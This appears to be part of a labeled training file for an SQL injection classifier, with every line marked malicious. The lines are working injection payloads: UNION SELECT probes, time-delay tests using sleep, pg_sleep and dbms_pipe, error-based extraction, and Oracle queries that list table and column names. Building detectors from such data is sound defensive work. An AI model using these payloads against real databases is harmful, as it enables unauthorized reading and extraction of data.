+__label__malicious  1%' )  union all select null,null,null,null,null--
+__label__malicious  select pg_sleep ( 5 )  and "ilyw" like "ilyw
+__label__malicious  1"  )  )   )  union all select null,null,null,null,null,null,null,null,null--
+__label__malicious   select * from users where id = 1 or 1#"@ union select 1,version (  )  -- 1
+__label__malicious  -9734'  )  )   as izbx where 6273 = 6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--
+__label__malicious  1"  )  )   )  union all select null--
+__label__malicious  -1988 where 4597 = 4597 union all select 4597,4597,4597,4597,4597,4597--
+__label__malicious  1  )  )   or sleep ( __TIME__ ) #
+__label__malicious  ' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i
+__label__malicious  1,exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 7759 = 7759,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  
+__label__malicious  -2423'  )  )   )  union all select 8256,8256,8256,8256,8256,8256,8256,8256--
+__label__malicious  1"  )  )   union all select null,null,null,null,null--
+__label__malicious  ' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i
+__label__malicious  1'|| ( select 'setd' from dual where 3686 = 3686  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users  )  )  ||'
+__label__malicious  1%' )  order by 1#
+__label__malicious  1'+ ( select hvsb where 3666 = 3666
+__label__malicious  1" )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( "hrkf" like "hrkf
+__label__malicious  -7808"  )  )   as jgkk where 9230 = 9230 or elt ( 1032 = 1032,3623 ) --
+__label__malicious  1 )  as qyic where 9736 = 9736 and elt ( 3114 = 3114,sleep ( 5  )  )  #
+__label__malicious  1" )  where 6632 = 6632 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --
+__label__malicious  1'+ ( select nzij where 5456 = 5456 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x  )  )  +'
+__label__malicious  "^"
+__label__malicious  ' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i
+__label__malicious  1' )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( 'yqzg' = 'yqzg
+__label__malicious  1" )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and  ( "thkh" like "thkh
+__label__malicious  -8264%' )  order by 1#
+__label__malicious  1 where 4331 = 4331 union all select null,null,null,null,null,null#
+__label__malicious  1" )  where 2367 = 2367
+__label__malicious  1 where 8045 = 8045 union all select null,null,null--
+__label__malicious   select * from users where id = 1 or "; ( " or 1 = 1 -- 1
